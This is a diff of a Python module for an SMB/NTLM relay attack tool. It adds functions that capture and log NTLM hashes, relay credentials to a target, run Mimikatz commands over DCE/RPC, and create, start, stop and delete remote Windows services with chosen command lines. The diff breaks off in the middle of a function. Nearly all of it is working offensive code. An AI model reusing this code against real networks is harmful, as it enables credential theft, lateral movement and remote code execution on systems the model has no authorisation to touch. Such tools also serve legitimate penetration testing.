@@ -21,12 +21,14 @@ import time
 import os
 import re
 import datetime
+import threading
 from RelayMultiPackets import *
 from odict import OrderedDict
 from base64 import b64decode, b64encode
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'creddump')))
 from framework.win32.hashdump import dump_file_hashes
 from SMBFinger.Finger import ShowSmallResults
+from socket import *
 
 SaveSam_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/relay-dumps/"
 Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../../"
@@ -34,10 +36,8 @@ Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../../"
 READTIMEOUT = 1
 READ = "\xc0\x00"
 RW   = "\xc2\x00"
-
-def longueur(payload):
-    length = struct.pack(">i", len(''.join(payload)))
-    return length
+MimiKatzSVCName  = ""
+MimiKatzSVCID  = ""
 
 class Packet():
     fields = OrderedDict([
@@ -98,7 +98,7 @@ def IsSMBAnonymous(data):
     else:
        return False
 
-def ParseHTTPHash(data, key, client,UserToRelay,Host):
+def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
 	LMhashLen    = struct.unpack('<H',data[12:14])[0]
 	LMhashOffset = struct.unpack('<H',data[16:18])[0]
 	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
@@ -117,11 +117,22 @@ def ParseHTTPHash(data, key, client,UserToRelay,Host):
 		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
 		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, key.encode("hex"))
 		WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
-                print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
+                if client == Host:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Attempting reflective NTLM Relay, this is likely to fail." 
+                else:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
 
                 if User in UserToRelay or "ALL" in UserToRelay:
+                        if Pivoting[0] == "1":
+                           return User, Domain
                         print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
-                        if ReadData("SMBRelay-Session.txt", client, User, HostName, Host[0], cmd=None):
+                        if ReadData("SMBRelay-Session.txt", client, User, HostName, Host, cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
                         else:
@@ -131,7 +142,6 @@ def ParseHTTPHash(data, key, client,UserToRelay,Host):
                 	return None, None
 
 	if NthashLen > 24:
-		NthashLen      = 64
 		DomainLen      = struct.unpack('<H',data[28:30])[0]
 		DomainOffset   = struct.unpack('<H',data[32:34])[0]
 		Domain         = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
@@ -140,10 +150,23 @@ def ParseHTTPHash(data, key, client,UserToRelay,Host):
 		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
 		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, key.encode("hex"), NTHash[:32], NTHash[32:])
 		WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
-                print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
+                if client == Host:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Attempting reflective NTLM Relay, this is likely to fail."
+                else:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
                 if User in UserToRelay or "ALL" in UserToRelay:
+                        if Pivoting[0] == "1":
+                           return User, Domain
+
                         print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
-                        if ReadData("SMBRelay-Session.txt", client, User, Domain, Host[0], cmd=None):
+
+                        if ReadData("SMBRelay-Session.txt", client, User, Domain, Host, cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
                         else:
@@ -153,7 +176,7 @@ def ParseHTTPHash(data, key, client,UserToRelay,Host):
                 	return None, None
 
 
-def ParseSMBHash(data,client, challenge,UserToRelay,Host):  #Parse SMB NTLMSSP v1/v2
+def ParseSMBHash(data,client, challenge,UserToRelay,Host,Pivoting):  #Parse SMB NTLMSSP v1/v2
         SSPIStart  = data.find('NTLMSSP')
         SSPIString = data[SSPIStart:]
 	LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
@@ -172,10 +195,22 @@ def ParseSMBHash(data,client, challenge,UserToRelay,Host):  #Parse SMB NTLMSSP v
 		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
 		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, challenge.encode("hex"))
 		WriteData(Logs_Path+"logs/SMB-Relay-SMB-"+client+".txt", WriteHash, Username)
-                print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
+                if client == Host:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Attempting reflective NTLM Relay, this is likely to fail."
+                else:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
                 if Username in UserToRelay or "ALL" in UserToRelay:
+                        if Pivoting[0] == "1":
+                           return Username, Domain
+
                         print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
-                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host[0], cmd=None):
+                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
                         else:
@@ -194,10 +229,21 @@ def ParseSMBHash(data,client, challenge,UserToRelay,Host):  #Parse SMB NTLMSSP v
 		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
 		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, challenge.encode("hex"), SMBHash[:32], SMBHash[32:])
 		WriteData(Logs_Path+"logs/SMB-Relay-SMB-"+client+".txt", WriteHash, Username)
-                print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
+                if client == Host:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Attempting reflective NTLM Relay, this is likely to fail."
+                else:
+                   if Pivoting[0] == "1":
+                      pass
+                   else:
+                      print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
                 if Username in UserToRelay or "ALL" in UserToRelay:
+                        if Pivoting[0] == "1":
+                           return Username, Domain
                         print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
-                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host[0], cmd=None):
+                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
                         else:
@@ -213,21 +259,27 @@ def Parse_Nego_Dialect(data):
 		if Dialect[i] == 'NT LM 0.12':
 			return chr(i) + '\x00'
 
-def ExtractSMBChallenge(data):
+def ExtractSMBChallenge(data, Pivoting):
     SSPIStart  = data.find('NTLMSSP')
     SSPIString = data[SSPIStart:]
     Challenge  = SSPIString[24:32]
-    print "[+] Setting up SMB relay with SMB challenge:", Challenge.encode("hex")
-    return Challenge
+    if Pivoting[0] == "1":
+       return Challenge
+    else:
+       print "[+] Setting up SMB relay with SMB challenge:", Challenge.encode("hex")
+       return Challenge
 
-def ExtractHTTPChallenge(data):
+def ExtractHTTPChallenge(data,Pivoting):
     SecBlobLen = struct.unpack("<h", data[43:45])[0]
     if SecBlobLen <= 257:
        Challenge = data[102:110]
     if SecBlobLen >= 258:
        Challenge = data[106:114]
-    print "[+] Setting up HTTP relay with SMB challenge:", Challenge.encode("hex")
-    return Challenge
+    if Pivoting[0] == "1":
+       return Challenge
+    else:
+       print "[+] Setting up HTTP relay with SMB challenge:", Challenge.encode("hex")
+       return Challenge
 
 #Here we extract the complete NTLM message from an HTTP request and we will later feed it to our SMB target.
 def ExtractRawNTLMPacket(data):
@@ -241,20 +293,30 @@ def GetSessionResponseFlags(data):
     if data[41:43] == "\x01\x00":
        print "[+] Server returned session positive, but as guest. Psexec should fail even if authentication was successful.."
 
-#not used.
-def SMBKeepAlive(s, data, time):
+#Keeps our connection alive.
+def SMBKeepAlive(s, data):
     head = SMBHeader(cmd="\x2b",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
     t = SMBEcho()
     packet1 = str(head)+str(t)
     buffer1 = longueur(packet1)+packet1  
     s.send(buffer1)
     data = s.recv(2048)
-    time.sleep(time)
+    time.sleep(1)
+
 
 #Used for SMB read operations. We grab everything past the Byte Count len in the packet.
 def ExtractCommandOutput(data):
     DataLen = struct.unpack("<H", data[61:63])[0]
     Output = data[63:63+DataLen]
+    return Output
+
+#Used for SMB/DCE-RPC read operations. We grab everything past the Byte Count len in the packet.
+def ExtractRPCCommandOutput(data):
+    DataLen = struct.unpack("<H", data[61:63])[0]
+    if data[64:66] == "\x05\x00":
+       Output = data[88:88+DataLen]
+    else:
+       Output = data[64:64+DataLen]
     return Output
 
 #from:http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
@@ -269,6 +331,80 @@ def GetReadableSize(size,precision=2):
 def WriteOutputToFile(data, File):
     with open(SaveSam_Path+"/"+File, "wb") as file:
         file.write(data)
+
+def FindLocalIp():
+    s = socket(AF_INET, SOCK_DGRAM)
+    try:
+        s.connect(("1.1.1.1", 0))
+        IP = s.getsockname()[0]
+        s.close()
+    except:
+        print "It seems like you're not connected to any network.."
+        IP = '127.0.0.1'
+        s.close()
+    return IP
+
+def longueur(payload):
+    length = struct.pack(">i", len(''.join(payload)))
+    return length
+
+def ConvertToClassC(Host, Class):
+    Class = Class.strip()
+    Ip = re.split(r'(\.|/)', Host)
+    if Class == "/24":
+       Ip[6:7] = ["0"]
+       return ''.join(Ip)+Class
+    if Class == "/16":
+       Ip[4:5] = ["0"]
+       Ip[6:7] = ["0"]
+       return ''.join(Ip)+Class
+    else:
+       print "Illegal class, please use: /24 or /16"
+       return None
+
+def GenerateRandomFileName():
+    return ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(random.randint(5, 15))])
+
+def GenerateServiceName():
+    return ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
+
+def GenerateServiceID():
+    return''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
+
+###
+#SMBRelay grab
+###
+
+def GrabNegotiateFromTarget(data, s, Pivoting):
+      ## Start with nego protocol + session setup negotiate to our target.
+      h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
+      n = SMBNegoCairo(Data = SMBNegoCairoData())
+      n.calculate()
+      packet0 = str(h)+str(n)
+      buffer0 = longueur(packet0)+packet0
+      s.send(buffer0)
+      smbdata = s.recv(4096)
+      ##Session Setup AndX Request, NTLMSSP_NEGOTIATE to our target.
+      if smbdata[8:10] == "\x72\x00":
+         head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
+         t = data[36:] #simply grab the whole packet except the smb header from the client.
+         packet1 = str(head)+str(t)
+         buffer1 = longueur(packet1)+packet1  
+         s.send(buffer1)
+         smbdata = s.recv(4096)   
+         challenge = ExtractSMBChallenge(smbdata, Pivoting)#Grab the challenge, in case we want to crack the hash later.
+         return data, smbdata, s, challenge
+
+def SendChallengeToClient(data, smbdata, conn):
+     ##Relay all that to our client.
+     if data[8:10] == "\x73\x00":
+         head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x16\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
+         t = smbdata[36:]#simply grab the whole packet except the smb header from the client.
+         packet0 = str(head)+str(t)
+         buffer0 = longueur(packet0)+packet0
+         conn.send(buffer0)
+         data = conn.recv(4096)
+         return data, conn
 
 ##This function is one of the main SMB read function. We request all the time 65520 bytes to the server. 
 #Add (+32 (SMBHeader) +4 Netbios Session Header + 27 for the ReadAndx structure) +63 and you end up with 65583.
@@ -307,49 +443,42 @@ def ReadOutput(DataOffset, f, data, s):
      s, data = SMBReadRecv(s)
      return data, s, ExtractCommandOutput(data)
 
+##We send our WriteAndX request with our offset. 
+def WriteOutput(DataOffset, Chunk, data, f, s):
+     head = SMBHeader(cmd="\x2f", flag1="\x18", flag2="\x07\xc8", uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
+     t = SMBWriteData(FID=f, Offset = DataOffset, Data= Chunk)
+     t.calculate()
+     packet1 = str(head)+str(t)
+     buffer1 = longueur(packet1)+packet1
+     s.send(buffer1)
+     data = s.recv(2048)
+     ##LockingAndX //should not happens since we didn't request an oplock, but just in case..
+     if data[8:10] == "\x24\x00":
+        head = SMBHeader(cmd="\x24", flag1="\x88", flag2="\x07\xc8", uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
+        t = SMBLockingAndXResponse()
+        packet1 = str(head)+str(t)
+        buffer1 = longueur(packet1)+packet1
+        s.send(buffer1)
+     return data, s
+
 ##When used this function will inject an OpenAndX file not found SMB Header into an incoming packet. 
-##This is usefull for us when an operation fail. We land back to our shell and send directly a
-##Tree Connect IPC$ so we don't loose this precious connection.
+##This is usefull for us when an operation fail. We land back to our shell send right away a
+##Tree Connect IPC$ and start to send SMB echos so we don't loose this precious connection.
 def ModifySMBRetCode(data):
      modified = list(data)
      modified[8:10] = "\x2d\x34"
      return ''.join(modified)
 
+##We send our ReadAndX request with our offset and call recv()
+def SMBDCERPCReadOutput(DataOffset, length,f, data, s):
+     head = SMBHeader(cmd="\x2e",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
+     t = SMBDCERPCReadRequestAndX(FID=f, MaxCountLow=length, MinCount=length,Offset = DataOffset)
+     packet1 = str(head)+str(t)
+     buffer1 = longueur(packet1)+packet1  
+     s.send(buffer1)
+     data = s.recv(8092)
+     return data, s, ExtractRPCCommandOutput(data)
 
-###
-#SMBRelay grab
-###
-
-def GrabNegotiateFromTarget(data, s):
-      ## Start with nego protocol + session setup negotiate to our target.
-      h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
-      n = SMBNegoCairo(Data = SMBNegoCairoData())
-      n.calculate()
-      packet0 = str(h)+str(n)
-      buffer0 = longueur(packet0)+packet0
-      s.send(buffer0)
-      smbdata = s.recv(4096)
-      ##Session Setup AndX Request, NTLMSSP_NEGOTIATE to our target.
-      if smbdata[8:10] == "\x72\x00":
-         head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
-         t = data[36:] #simply grab the whole packet except the smb header from the client.
-         packet1 = str(head)+str(t)
-         buffer1 = longueur(packet1)+packet1  
-         s.send(buffer1)
-         smbdata = s.recv(4096)   
-         challenge = ExtractSMBChallenge(smbdata)#Grab the challenge, in case we want to crack the hash later.
-         return data, smbdata, s, challenge
-
-def SendChallengeToClient(data, smbdata, conn):
-     ##Relay all that to our client.
-     if data[8:10] == "\x73\x00":
-         head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x16\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
-         t = smbdata[36:]#simply grab the whole packet except the smb header from the client.
-         packet0 = str(head)+str(t)
-         buffer0 = longueur(packet0)+packet0
-         conn.send(buffer0)
-         data = conn.recv(4096)
-         return data, conn
 ###
 #BindCall
 ###
@@ -357,7 +486,7 @@ def SendChallengeToClient(data, smbdata, conn):
 def BindCall(UID, Version, File, data, s):
     Data = data
     head = SMBHeader(cmd="\xa2",flag1="\x18", flag2="\x02\x28",mid="\x05\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-    t = SMBNTCreateData(FileName=File)
+    t = SMBNTCreateDataSVCCTL(FileName=File)
     t.calculate()
     packet0 = str(head)+str(t)
     buffer1 = longueur(packet0)+packet0
@@ -385,12 +514,13 @@ def BindCall(UID, Version, File, data, s):
         x = SMBDCEData(CTX0UID=UID, CTX0UIDVersion=Version)
         x.calculate()
         f = data[42:44]
-        t = SMBWriteData(FID=f,Data=x)
+        t = SMBDCERPCWriteData(FID=f,Data=x)
         t.calculate()
         packet0 = str(head)+str(t)
         buffer1 = longueur(packet0)+packet0
         s.send(buffer1)
         data = s.recv(2048)
+
     ## DCE/RPC Read.
     if data[8:10] == "\x2f\x00":
             head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
@@ -403,9 +533,85 @@ def BindCall(UID, Version, File, data, s):
             return data, s, f
 
 ###########################
-#Launch And Create Service
+#Launch A Mimikatz CMD
 ###########################
-def CreateService(Command, f, host, data, s):
+def MimiKatzRPC(Command, f, host, data, s):
+       ## DCE/RPC MimiKatzRPC.
+       ## DCE/RPC Write.
+       if data[8:10] == "\x2e\x00":
+            head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x06\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+            w = SMBDCEMimiKatzRPCCommand(CMD=Command)
+            w.calculate()
+            x = SMBDCEPacketData(Data=w, Opnum="\x00\x00")
+            x.calculate()
+            t = SMBDCERPCWriteData(FID=f,Data=x)
+            t.calculate()
+            packet0 = str(head)+str(t)
+            buffer1 = longueur(packet0)+packet0
+            s.send(buffer1)
+            data = s.recv(2048)
+
+       ## DCE/RPC Read.
+       if data[8:10] == "\x2f\x00":
+            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+            t = SMBReadData(FID=f,MaxCountLow=struct.pack('<h', 1024), MinCount=struct.pack('<h', 1024), Offset="\x00\x00\x00\x00")
+            t.calculate()
+            packet0 = str(head)+str(t)
+            buffer1 = longueur(packet0)+packet0
+            s.send(buffer1)
+            data = s.recv(2048)
+
+       ##ReadRequest.
+       ##Used when output =< 1024, therefore only one read.
+       if data[8:10] == "\x2e\x00":
+          #First Packet from output contains the complete len of what's coming, don't print it.
+          LenOut = len(ExtractRPCCommandOutput(data))
+          Output = ExtractRPCCommandOutput(data)[12:LenOut-9]
+          print Output
+          return data,s,f
+
+       ##Do large RPC reads..
+       if data[8:10] == "\x2e\x05":
+          buffsize = 1024
+          filesize = struct.unpack('<i', data[96:100])[0]*2
+          print 'File size: %s'%(GetReadableSize(filesize))
+          dataoffset = 0
+          start_time = time.time()
+          ##First Packet from output contains the complete len of what's coming, don't print it.
+          Output = ExtractRPCCommandOutput(data)[12:]
+          while True:
+              dataoffset = dataoffset + buffsize
+              if data[64:66] == "\x05\x00" and data[67] == "\x02":##Last DCE/RPC Frag
+                 LastFragLen = struct.unpack('<h', data[61:63])[0]
+                 if LastFragLen < 1024:
+                    Output += ExtractRPCCommandOutput(data)
+                    break
+                 else:
+                    data, s, out = SMBDCERPCReadOutput(struct.pack("<i", dataoffset), struct.pack('<h', 4096),f, data, s)
+                    Output += ExtractRPCCommandOutput(data)
+                    break
+
+              if data[64:66] == "\x05\x00" and data[67] == "\x03":##First and Last DCE/RPCFrag
+                 data, s, out = SMBDCERPCReadOutput(struct.pack("<i", dataoffset), struct.pack('<h', 4096),f, data, s)
+                 Output += ExtractRPCCommandOutput(data)
+                 break
+                  
+              else:
+                 data, s, out = SMBDCERPCReadOutput(struct.pack("<i", dataoffset), struct.pack('<h', buffsize),f, data, s)
+                 Output += ExtractRPCCommandOutput(data)
+          Seconds = (time.time() - start_time)
+          if Seconds>60:
+              minutes = Seconds/60
+              print 'Fetched in: %.3g minutes.'%(minutes)
+          if Seconds<60:
+              print 'Fetched in: %.3g seconds'%(Seconds)
+          print "Output:\n", Output
+          return data,s,f
+
+######################################
+#Launch And Create a MimiKatz Service
+######################################
+def CreateMimikatzService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
     ## DCE/RPC SVCCTLOpenManagerW.
     if data[8:10] == "\x2e\x00":
         head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
@@ -428,10 +634,8 @@ def CreateService(Command, f, host, data, s):
     ## DCE/RPC Create Service.
     if data[8:10] == "\x25\x00":
         ContextHandler = data[84:104]
-        ServiceNameChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
-        ServiceIDChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
         head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler, ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,BinCMD=Command)
+        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,BinCMD=Command)
         w.calculate()
         x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
         x.calculate()
@@ -448,7 +652,6 @@ def CreateService(Command, f, host, data, s):
         if data[len(data)-4:] == "\x05\x00\x00\x00":
             print "[+] Failed to create the service\n"
             return ModifySMBRetCode(data)
-        #print "[+] Service name: %s with display name: %s successfully created"%(ServiceNameChars, ServiceIDChars)
         ContextHandlerService = data[88:108]
         head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
         w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
@@ -496,6 +699,225 @@ def CreateService(Command, f, host, data, s):
         data = s.recv(2048)
         s.send(buffer1)
         data = s.recv(2048)
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    ## DCE/RPC SVCCTLCloseService
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to query the service.\n"
+            return ModifySMBRetCode(data)
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandlerService)
+        x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+        return data, s, f 
+
+###########################
+#Stop And Delete A Service
+###########################
+def StopAndDeleteService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
+    ## DCE/RPC SVCCTLOpenManagerW.
+    if data[8:10] == "\x2e\x00":
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=host)
+        w.calculate()
+        x = SMBDCEPacketData(Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+    ##Error handling.
+    if data[8:10] == "\x2e\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n"
+            return ModifySMBRetCode(data)
+
+    ## DCE/RPC SVCCTLOpenService.
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to create the service\n"
+            return ModifySMBRetCode(data)
+        ContextHandlerService = data[84:104]
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandlerService,ServiceName=ServiceNameChars)
+        w.calculate()
+        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    ## DCE/RPC SVCCTLControlService, stop operation.
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to open the service.\n"
+            return ModifySMBRetCode(data)
+        ContextHandlerService = data[84:104]
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLControlService(ContextHandle=ContextHandlerService, ControlOperation="\x01\x00\x00\x00")
+        x = SMBDCEPacketData(Opnum="\x01\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    ## DCE/RPC SVCCTLDeleteService.
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to stop the service.\n"
+            return ModifySMBRetCode(data)
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLDeleteService(ContextHandle=ContextHandlerService)
+        x = SMBDCEPacketData(Opnum="\x02\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    ## DCE/RPC SVCCTLCloseService
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to delete the service.\n"
+            return ModifySMBRetCode(data)
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandlerService)
+        x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+        return data, s, f 
+
+
+###########################
+#Launch And Create Service
+###########################
+def CreateService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
+    ## DCE/RPC SVCCTLOpenManagerW.
+    if data[8:10] == "\x2e\x00":
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=host)
+        w.calculate()
+        x = SMBDCEPacketData(Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+    ##Error handling.
+    if data[8:10] == "\x2e\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n"
+            return ModifySMBRetCode(data)
+
+    ## DCE/RPC Create Service.
+    if data[8:10] == "\x25\x00":
+        ContextHandler = data[84:104]
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,BinCMD=Command)
+        w.calculate()
+        x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+        #print "[+] Creating service"
+
+    ## DCE/RPC SVCCTLOpenService.
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to create the service\n"
+            return ModifySMBRetCode(data)
+        ContextHandlerService = data[88:108]
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
+        w.calculate()
+        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    ## DCE/RPC SVCCTLStartService.
+    if data[8:10] == "\x25\x00":
